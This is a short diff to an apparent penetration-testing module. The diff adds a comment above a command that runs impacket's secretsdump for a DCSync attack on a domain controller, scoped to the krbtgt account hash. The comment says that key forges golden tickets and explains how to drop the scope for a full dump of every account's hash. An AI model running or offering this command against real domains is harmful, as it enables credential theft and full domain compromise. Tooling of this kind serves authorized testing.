@@ -97,4 +97,11 @@ def run(target, ctx):
         return ("# dcsync vs %s\n\n[SKIP] impacket not installed — secretsdump "
                 "unavailable (pip install impacket / apt python3-impacket)." % target)
     return ctx.run_cmd(
+        # DCSync of JUST krbtgt — CONSISTENT with the in-process path above (which
+        # uses justUser="krbtgt"). krbtgt is the DCSync crown jewel (its key forges
+        # golden tickets = full-domain compromise), so pulling only it proves the
+        # attack while avoiding dumping every account's hash into evidence. You do
+        # NOT need -just-dc-user to "do DCSync" — a bare secretsdump dumps the whole
+        # domain via the same DRSUAPI replication; this is just the scoped, cleaner
+        # PoC. Drop the flag here (and set justUser=None above) for a full dump.
         tool + " {domain}/{dc_user}:{dc_pass}@{target} -just-dc-user krbtgt", target)
